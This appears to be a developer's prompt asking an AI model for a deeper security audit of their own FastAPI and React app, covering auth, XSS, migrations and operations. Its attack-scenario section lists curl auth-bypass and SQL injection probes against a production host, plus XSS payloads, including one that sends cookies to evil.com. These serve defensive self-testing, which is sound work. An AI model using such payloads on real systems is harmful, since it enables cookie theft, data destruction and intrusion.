# GPT-5 Pro Security Audit - Phase 2 Deep Dive

**Context**: You conducted an initial security audit and found 4 critical (P0) issues. We've fixed all of them. Now we need you to go deeper.

---

## ✅ What We Fixed (Your P0 Findings)

### 1. Sentry PII Leakage - FIXED
**Your finding**: `sendDefaultPii: true` + 100% sampling shipped PII  
**Our fix**: 
- Set `sendDefaultPii: false`
- Reduced `tracesSampleRate: 1.0 → 0.01` (1% sampling)
- Added `beforeSend()` to scrub auth headers, cookies, API keys
- Applied to both `sentry.server.config.js` and `sentry.edge.config.js`

**Validation needed**: Are we still leaking anything? Check the scrubbing logic.

---

### 2. Debug Endpoint - DELETED
**Your finding**: `/debug/cors` exposed configuration  
**Our fix**: Deleted the entire endpoint

**Validation needed**: Are there other debug/info disclosure endpoints we missed?

---

### 3. Default Admin Key - REMOVED  
**Your finding**: `admin_api_key = "change-me-in-production"` dangerous  
**Our fix**:
- Removed default value (now required env var)
- Added startup assertion that fails if not set or still has default value
- Code in `services/etl/app/main.py` lines 52-57

**Validation needed**: Is the startup check robust enough?

---

### 4. Auth Header Mismatch - FIXED
**Your finding**: Frontend sent Bearer, backend expected X-API-Key  
**Our fix**:
- Changed frontend to send `X-API-Key` instead of `Authorization: Bearer`
- Updated `apps/web/lib/api.ts` lines 94, 112

**Validation needed**: Are all admin endpoints consistently enforcing this now?

---

### 5. CORS Credentials - DISABLED
**Your finding**: `allow_credentials=True` risky  
**Our fix**: Set to `False`

**Validation needed**: Could this break anything legitimate?

---

## 🔍 PHASE 2 - DEEP DIVE REQUEST

You offered to go deeper. Here's everything you asked for:

---

### A) Auth Implementation (Full Audit)

**File 1: services/etl/app/main.py** (auth dependency)
```python
[PASTE LINES 1240-1250 - verify_api_key function]

def verify_api_key(x_api_key: str = Header(...)):
    """Verify API key for admin endpoints."""
    if x_api_key != settings.admin_api_key:
        raise HTTPException(status_code=403, detail="Invalid API key")
    return True
```

**Question**: Is this secure enough or trivial to bypass?

**All Admin POST Endpoints**:
[I'll provide list of all @app.post("/v1/admin/*") handlers below]

**Your task**: 
- Verify EVERY admin endpoint uses `Depends(verify_api_key)` or `x_api_key: str = Header(None)`
- Find any admin endpoints that skip auth
- Check for timing attacks in the comparison
- Verify error messages don't leak info

---

### B) XSS Audit (Component Rendering)

**Concern**: Event summaries/titles come from external sources (arXiv, company blogs)

**Files to check**:
- Frontend components that render event data
- Any use of `dangerouslySetInnerHTML`
- Any unsanitized HTML rendering

**Your task**:
- Find XSS vectors in event rendering
- Check if summaries/titles are escaped
- Verify no unsafe HTML rendering exists

---

### C) Migration Safety (Alembic Files)

**Files**: `infra/migrations/versions/`

**Recent critical migration**: `022_production_baseline_reconcile.py`
- Creates 17 indexes
- Drops embedding columns
- Adds CHECK constraints
- [PASTE FULL FILE BELOW]

**Your task**:
- Will these lock tables on large datasets?
- Are there race conditions?
- Is the downgrade() safe?
- What happens if it fails mid-execution?

---

### D) Infrastructure as Code

**Current state**: 
- No Terraform (manual Railway + Vercel setup)
- No Helm charts (not using Kubernetes)
- No automated infra

**What exists**:
- `railway.json` - Railway deployment config
- `docker-compose.dev.yml` - Dev environment
- `Dockerfile` - Container build
- `.github/workflows/` - None currently

**Your task**:
- Is manual infra setup a security risk?
- Should we have IaC for reproducibility?
- Are secrets management practices safe?

---

## 📂 FILES FOR YOUR REVIEW

### FULL AUTH IMPLEMENTATION

```python
# services/etl/app/main.py - Auth dependency (lines ~1240-1250)
def verify_api_key(x_api_key: str = Header(...)):
    """Verify API key for admin endpoints."""
    if x_api_key != settings.admin_api_key:
        raise HTTPException(status_code=403, detail="Invalid API key")
    return True

# All Admin POST Endpoints (verify each has auth):
# Line 1249: @app.post("/v1/admin/retract")
# Line 1287: @app.post("/v1/admin/recompute") 
# Line 1778: @app.post("/v1/admin/events/{event_id}/approve")
# Line 1815: @app.post("/v1/admin/events/{event_id}/reject")
# Line 2271: @app.post("/v1/admin/retract") [duplicate?]
# Line 2609: @app.post("/v1/admin/prompts")
# Line 2673: @app.post("/v1/admin/prompts/{prompt_id}/deprecate")
# Line 2976: @app.post("/v1/admin/api-keys")
# Line 3262: @app.post("/v1/admin/validate-urls")
# Line 3297: @app.post("/v1/admin/validate-url/{event_id}")
# Line 3453: @app.post("/v1/admin/trigger-ingestion") [NEW - just added]

[PASTE ACTUAL CODE OF EACH ADMIN ENDPOINT IF NEEDED]
```

---

### MIGRATION SAFETY

```python
# infra/migrations/versions/022_production_baseline_reconcile.py
[PASTE FULL FILE - 400+ lines]

Questions:
1. The 17 CREATE INDEX statements - will they lock the events table?
2. DROP COLUMN IF EXISTS embedding - safe on production with data?
3. CHECK constraints - added while table has data, will this scan/lock?
4. Is this safe to run on a 10,000 event database? 100,000?
```

---

### XSS SURFACE AREA

**Event rendering locations** (need audit):

```typescript
// apps/web/components/events/EventCard.tsx (or similar)
// apps/web/app/events/page.tsx
// Any component that displays event.title or event.summary

Questions to answer:
1. Are event titles/summaries rendered safely?
2. Any dangerouslySetInnerHTML usage?
3. Are URLs from events clickable? (XSS via href?)
4. Are publisher names rendered safely?
5. What about markdown in summaries (if any)?
```

---

### INFRASTRUCTURE & SECRETS

**Railway Setup** (manual):
```bash
# Environment variables (from `railway variables`):
ADMIN_API_KEY=<secret>
OPENAI_API_KEY=<secret>
DATABASE_URL=<auto-injected>
SENTRY_DSN_API=<public, but should be>

Questions:
1. Are secrets rotatable?
2. Is there audit logging for who changed what?
3. Backup strategy for DATABASE_URL?
4. What happens if Railway goes down?
5. Is there staging environment separate from prod?
```

**Dockerfile**:
```dockerfile
[PASTE Dockerfile - lines 1-43]

Questions:
1. Are we building as root? (security risk)
2. Any secrets baked into image?
3. Dependencies pinned or floating? (supply chain)
```

---

## 🎯 SPECIFIC QUESTIONS FOR PHASE 2

### Security Deep-Dive

**1. Auth System**:
- Is the single API key comparison (`x_api_key != settings.admin_api_key`) secure?
- Timing attack vulnerable?
- No rate limiting on auth attempts?
- Should we have role-based access (read-only vs full admin)?

**2. SQL Injection** (you said ORM looks safe, verify):
```python
# Any raw SQL we should worry about?
grep -r "text(" services/etl/app/
grep -r ".execute(f" services/etl/app/
grep -r "raw(" services/etl/app/
```

**3. XSS** (you said React escapes by default, verify):
- Any `dangerouslySetInnerHTML` usage?
- Any markdown rendering from untrusted sources?
- Any URL rendering that could execute JS?

**4. Data Integrity**:
- Can two ingestion tasks race and create duplicates?
- What if Celery task fails after INSERT but before commit?
- What if database transaction rolls back mid-migration?

**5. Secrets Management**:
- Are Railway env vars encrypted at rest?
- Can we rotate ADMIN_API_KEY without downtime?
- Is OPENAI_API_KEY logged anywhere?

---

### Performance & Scale

**6. Database Indexes**:
You mentioned missing composite indexes. Specifically:
```sql
-- Do we need these?
CREATE INDEX idx_events_signpost_published ON events(signpost_id, published_at DESC);
CREATE INDEX idx_events_tier_date_id ON events(evidence_tier, published_at DESC, id);
CREATE INDEX idx_event_links_signpost_conf ON event_signpost_links(signpost_id, confidence DESC);
```

Run EXPLAIN on our common queries and find missing indexes.

**7. N+1 Queries**:
```python
# In /v1/events endpoint - are we doing N+1 on signpost_links?
# Check line ~1350-1450 in main.py
```

**8. Connection Pool**:
- Default pool size for SQLAlchemy?
- What happens at 100 concurrent requests?
- Will we exhaust connections?

---

### Operational Risks

**9. Celery Reliability**:
- What if Redis (queue backend) dies mid-task?
- Are tasks idempotent (safe to retry)?
- What if same task runs twice simultaneously?

**10. Disaster Recovery**:
- Backup frequency on Neon/Railway Postgres?
- Have we tested restore?
- RPO/RTO targets?

**11. Monitoring Gaps**:
- Are we alerting on the right things?
- What failure modes would be silent?
- Is Sentry enough or do we need more?

---

## 📋 WHAT I NEED FROM YOU (GPT-5 Pro)

### Round 2 Deliverables

**1. Auth Security Audit** (30 min):
- Review verify_api_key() implementation
- Check every admin endpoint for auth enforcement
- Find bypass vectors
- Recommend: rate limiting, timing-safe comparison, role-based access

**2. XSS/Injection Audit** (20 min):
- Scan frontend for dangerouslySetInnerHTML
- Check event rendering components
- Verify URL sanitization
- Find any unsafe HTML/markdown rendering

**3. Migration Risk Assessment** (30 min):
- Review migration 022 (17 indexes + column drops)
- Will it lock tables? For how long?
- Safe on 10K, 100K, 1M events?
- Recommend: index creation strategy, constraint timing

**4. Data Integrity Review** (20 min):
- Celery task race conditions?
- Transaction isolation issues?
- Deduplication failure modes?
- Index corruption scenarios?

**5. Operational Gaps** (20 min):
- Backup/DR blind spots?
- Monitoring coverage gaps?
- Failure modes we haven't considered?
- Secrets rotation strategy?

---

## 🎯 OUTPUT FORMAT (Please)

For each area:

```markdown
### [AREA] - Severity: Critical/High/Medium/Low

**Finding**: [What's wrong]

**Location**: [File:line or component]

**Exploit/Failure Scenario**: [Specific steps to break this]

**Impact**: [What happens - data loss, breach, downtime, etc.]

**Fix**: [Specific code change or process change]

**Effort**: [Trivial / Low / Medium / High]

**Priority**: [P0 immediate / P1 this week / P2 before launch / P3 technical debt]
```

---

## 📊 CURRENT STATE (After P0 Fixes)

**Commits since your first review**:
- c21bb7e: SECURITY fixes (Sentry PII, debug endpoint, admin key, auth mismatch, CORS)
- 485339f: Celery Beat enabled
- df9728f: Monitoring documentation

**System status**:
- 233 events in production
- 0 errors in Sentry (2 days uptime)
- Live data ingestion working (manual trigger tested)
- Deduplication working (0/385 duplicates added)

**What changed since your review**:
- Sentry configs hardened
- Debug endpoint deleted
- Auth unified on X-API-Key
- CORS credentials disabled

---

## 🔍 BE EVEN MORE BRUTAL

Round 1 found critical issues we missed. Round 2 should find:

**What will break when**:
- 1000 events/day get ingested?
- 10,000 concurrent users hit the API?
- Database grows to 100K events, 1M signpost links?
- Celery queue backs up to 1000 tasks?

**What will go wrong at 3 AM**:
- When Neon/Railway has a 5-minute outage?
- When OpenAI API returns 429 rate limit for an hour?
- When a malformed arXiv entry gets fetched?
- When two Celery Beat instances start (split brain)?

**What have we not tested**:
- Migration rollback (does downgrade() actually work?)
- Concurrent updates to same event (race condition?)
- Redis failover (does Celery recover?)
- Full database restore (have we ever tried?)

**What's the next CVE**:
- Where's the injection we haven't found yet?
- Where's the auth bypass in a code path we forgot?
- Where's the data corruption bug?
- Where's the memory leak that crashes after 48h?

---

## 📂 FILES ATTACHED FOR PHASE 2 REVIEW

[Below, I'll provide the actual files GPT-5 requested]

---

### AUTH.PY (or auth dependencies)

[Note: No separate auth.py exists - auth is in main.py]

```python
# services/etl/app/main.py - Lines 1240-1250
# Full auth implementation:

def verify_api_key(x_api_key: str = Header(...)):
    """Verify API key for admin endpoints."""
    if x_api_key != settings.admin_api_key:
        raise HTTPException(status_code=403, detail="Invalid API key")
    return True
```

**That's it.** No bcrypt, no timing-safe compare, no rate limiting.

**Question**: How bad is this? What attacks work?

---

### ALL ADMIN POST ENDPOINTS

```python
# LIST OF EVERY ADMIN ENDPOINT (extracted from main.py):

1. POST /v1/admin/retract (line 1249)
   Uses: Depends(verify_api_key)
   
2. POST /v1/admin/recompute (line 1287)
   Uses: Depends(verify_api_key)
   
3. POST /v1/admin/events/{event_id}/approve (line 1778)
   Uses: Depends(verify_api_key)
   
4. POST /v1/admin/events/{event_id}/reject (line 1815)
   Uses: Depends(verify_api_key)
   
5. POST /v1/admin/retract (line 2271) [DUPLICATE?]
   Uses: Depends(verify_api_key)
   
6. POST /v1/admin/prompts (line 2609)
   Uses: Depends(verify_api_key)
   
7. POST /v1/admin/prompts/{prompt_id}/deprecate (line 2673)
   Uses: Depends(verify_api_key)
   
8. POST /v1/admin/api-keys (line 2976)
   Uses: x_api_key: str = Header(None) + manual check
   
9. POST /v1/admin/validate-urls (line 3262)
   Uses: x_api_key: str = Header(None) + manual check
   
10. POST /v1/admin/validate-url/{event_id} (line 3297)
    Uses: x_api_key: str = Header(None) + manual check
    
11. POST /v1/admin/trigger-ingestion (line 3453)
    Uses: x_api_key: str = Header(None) + manual check

# INCONSISTENCY FOUND:
# Some use Depends(verify_api_key)
# Others use x_api_key: str = Header(None) + if check
# Is this a security hole?
```

**Your task**: 
- Are these consistently protected?
- Can any be bypassed?
- Which pattern is safer?

---

### XSS SURFACE - COMPONENTS RENDERING EVENTS

[I'll extract the key frontend files]

**Question**: Where do we render `event.title`, `event.summary`, `event.publisher`?

```typescript
// Example event data structure:
{
  "title": "Are Video Models Ready as Zero-Shot Reasoners? An Empirical...",
  "summary": "Recent video generation models can produce...",
  "publisher": "Ziyu Guo",
  "source_url": "http://arxiv.org/abs/2510.26802v1"
}
```

**If an attacker controls arXiv or OpenAI's blog RSS feed**, could they inject:
- `<script>alert('XSS')</script>` in title?
- `<img src=x onerror=alert(1)>` in summary?
- `javascript:alert(1)` in source_url?

**Check these files**:
[Will provide event rendering components]

---

### MIGRATION 022 - FULL FILE

```python
[PASTE FULL contents of infra/migrations/versions/022_production_baseline_reconcile.py]

# SPECIFIC CONCERNS:
# Line 75-95: 17x CREATE INDEX (no CONCURRENTLY, will lock?)
# Line 50: DROP COLUMN IF EXISTS embedding (safe?)
# Line 103-120: CHECK constraints (locks table while scanning?)
# Line 340-400: downgrade() - reversible?

# QUESTIONS:
1. Runtime on 10K events? 100K?
2. Will users see downtime?
3. What if it fails halfway through?
4. Is downgrade() tested?
```

---

### INFRASTRUCTURE FILES

```json
// railway.json
{
  "build": {"builder": "DOCKERFILE", "dockerfilePath": "Dockerfile"},
  "deploy": {
    "startCommand": "sh -c 'cd /app/migrations && alembic upgrade head && cd /app && (celery -A app.celery_app beat --loglevel=info &) && uvicorn app.main:app --host 0.0.0.0 --port $PORT'",
    "restartPolicyType": "ON_FAILURE",
    "restartPolicyMaxRetries": 10
  }
}

// Questions:
// 1. Is this command safe? Could it leave zombie processes?
// 2. What if alembic upgrade fails - does it retry infinitely?
// 3. Celery beat in background - how do we monitor it's still running?
```

---

## 🔥 SPECIFIC ATTACK SCENARIOS TO TEST

### 1. Auth Bypass
```bash
# Can I access admin endpoints without key?
curl -X POST "https://agitracker-production-6efa.up.railway.app/v1/admin/trigger-ingestion"

# Can I use empty string?
curl -X POST "..." -H "x-api-key: "

# Can I use the old default?
curl -X POST "..." -H "x-api-key: change-me-in-production"

# Timing attack to brute force?
# (Single character comparison vs constant-time)
```

### 2. XSS Injection
```bash
# If I control arXiv feed, can I inject:
{
  "title": "<script>alert('XSS')</script>",
  "summary": "<img src=x onerror='fetch(\"evil.com?cookie=\"+document.cookie)'>",
  "source_url": "javascript:alert(document.domain)"
}

# Will this render unsafely in the frontend?
```

### 3. SQL Injection (you said safe, but verify)
```bash
# Any raw SQL concatenation?
# Check /v1/events with malicious tier param:
curl "https://agitracker-production-6efa.up.railway.app/v1/events?tier=A';DROP TABLE events;--"

# Should be safe via ORM, but verify
```

### 4. Race Condition
```python
# If two Celery tasks ingest same event simultaneously:
# - Will dedup catch it?
# - Could we insert duplicate?
# - Check dedup_hash uniqueness constraint
```

### 5. Resource Exhaustion
```bash
# Can I DoS by requesting huge limit?
curl "https://agitracker-production-6efa.up.railway.app/v1/events?limit=999999"

# Is there a cap? (We set le=100 in some places, not all)
```

---

## ✅ VALIDATION CHECKLIST

After your Phase 2 audit, tell me:

- [ ] Auth: Is verify_api_key() secure enough or needs hardening?
- [ ] Auth: Are all admin endpoints consistently protected?
- [ ] XSS: Any dangerouslySetInnerHTML or unsafe rendering?
- [ ] SQL: Any raw query concatenation we missed?
- [ ] Migration: Will 022 lock tables unacceptably?
- [ ] Celery: Race conditions in task execution?
- [ ] Secrets: Proper rotation/management strategy?
- [ ] Backup: Is our DR plan sufficient?
- [ ] Scale: What breaks first at 10x load?
- [ ] Monitoring: Are we blind to any failure modes?

---

## 🎯 YOUR MISSION

**Be even more brutal than Round 1.**

- Find the subtle bugs (not just obvious config issues)
- Find the race conditions
- Find the scale bottlenecks
- Find what we haven't tested
- Find what will fail at 3 AM

**Output format**: Same as Round 1 (specific, actionable, severity-rated)

**Time limit**: Take as long as you need (we want thoroughness)

---

**Ready for your Phase 2 deep dive. Show me what we're still missing.** 🔍

